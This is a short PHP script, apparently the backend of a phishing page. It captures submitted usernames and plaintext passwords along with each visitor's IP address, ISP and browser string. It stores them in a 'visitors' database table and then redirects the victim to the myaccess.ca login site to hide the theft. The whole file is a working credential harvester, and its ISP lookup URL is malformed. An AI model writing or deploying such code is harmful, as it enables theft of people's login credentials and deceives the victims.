<?php
// 1. Database Connection using Render's Internal Database URL
// Paste your exact "Internal Database URL" between the quotes below
$internal_db_url = "YOUR_INTERNAL_DATABASE_URL_HERE";

try {
    // Parse the connection string to extract Postgres details automatically
    $dbopts = parse_url($internal_db_url);
    $dsn = "pgsql:host=" . $dbopts["host"] . ";port=" . $dbopts["port"] . ";dbname=" . ltrim($dbopts["path"], '/');
    
    $pdo = new PDO($dsn, $dbopts["user"], $dbopts["pass"]);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// 2. Capture Login Inputs
$username = $_POST['username'];
$password = $_POST['password']; // Raw unhashed string as requested

// 3. Capture Network & Browser Data
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// 4. Fetch ISP
$isp = "Unknown";
$api_url = "http://ip-api.com" . $ip_address; 
$api_response = @file_get_contents($api_url);
if ($api_response) {
    $ip_data = json_decode($api_response, true);
    if ($ip_data && $ip_data['status'] === 'success') {
        $isp = $ip_data['isp'];
    }
}

// 5. Insert into Postgres Database
try {
    $sql = "INSERT INTO visitors (username, password, ip_address, isp, user_agent) VALUES (:username, :password, :ip, :isp, :ua)";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        ':username'   => $username,
        ':password'   => $password,
        ':ip'         => $ip_address,
        ':isp'        => $isp,
        ':ua'         => $user_agent
    ]);
} catch (PDOException $e) {
    // If the table doesn't exist yet, this will catch it
    die("Data insertion failed: " . $e->getMessage());
}

// 6. Redirect the user
header("Location: https://myaccess.ca");
exit(); 
